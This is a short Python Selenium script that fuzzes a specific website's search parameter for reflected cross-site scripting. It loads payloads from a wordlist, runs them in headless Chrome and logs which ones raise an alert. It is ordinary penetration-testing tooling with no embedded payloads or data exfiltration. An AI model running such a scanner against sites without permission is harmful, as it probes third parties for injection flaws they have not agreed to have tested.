import tempfile
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

WORDLIST_PATH = "/usr/share/wordlists/xss/xss5.txt"
BASE_URL = "https://pentwest.com/?q={}"

def test_xss(driver, payload):
    url = BASE_URL.format(payload.strip())
    driver.get(url)
    try:
        WebDriverWait(driver, 2).until(EC.alert_is_present())
        alert = driver.switch_to.alert
        alert_text = alert.text
        alert.accept()
        return True, alert_text
    except Exception:
        return False, None

def main():
    with open(WORDLIST_PATH, "r", encoding="utf8") as f:
        payloads = f.readlines()

    results = []
    service = Service("/usr/bin/chromedriver")
    with tempfile.TemporaryDirectory() as tmpdirname:
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--blink-settings=imagesEnabled=false')
        options.add_argument(f"--user-data-dir={tmpdirname}")
        driver = webdriver.Chrome(service=service, options=options)

        for payload in payloads:
            success, alert_text = test_xss(driver, payload)
            print(f"Payload: {payload.strip()} | Alert detected: {success}")
            if success:
                results.append((payload.strip(), alert_text))

        driver.quit()

    print("\nSummary of successful payloads:")
    for payload, alert_text in results:
        print(f"Payload triggering alert: {payload} | Alert text: {alert_text}")

if __name__ == "__main__":
    main()
